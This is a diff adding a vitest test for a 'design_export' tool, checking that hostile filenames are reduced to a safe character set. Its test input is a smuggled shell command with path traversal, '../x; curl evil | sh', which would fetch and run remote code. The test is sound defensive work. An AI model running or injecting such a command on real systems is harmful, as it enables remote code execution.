@@ -262,6 +262,29 @@ describe("design tools", () => {
     expect(written[0].content).toBe(DOC);
   });
 
+  it("design_export reduces hostile filenames to a safe charset", async () => {
+    vi.stubGlobal("fetch", () =>
+      Promise.resolve(new Response(JSON.stringify({ revision: "r-002", content: DOC }), { status: 200 })),
+    );
+    const written: string[] = [];
+    const ctx = ctxWith(CFG);
+    ctx.requestDecision = () => Promise.resolve({ actionId: "approve", resolvedBy: "u1", resolvedAt: 1 });
+    ctx.sandbox = stubSandbox({
+      mkdir: () => Promise.resolve(),
+      writeFile: (path: string) => {
+        written.push(path);
+        return Promise.resolve();
+      },
+    });
+
+    // Shell metacharacters, spaces, and path traversal all collapse to '-'
+    // and the leading dot-dash prefix is stripped.
+    await designExportTool.execute({ format: "html", filename: '../x; curl evil | sh' }, ctx);
+    expect(written[0]).toBe("/workspace/exports/x-curl-evil-sh.html");
+    expect(written[0]).not.toContain("..");
+    expect(written[0]).not.toContain(";");
+  });
+
   it("design_export declined gate writes nothing", async () => {
     vi.stubGlobal("fetch", () =>
       Promise.resolve(new Response(JSON.stringify({ revision: "r-002", content: DOC }), { status: 200 })),
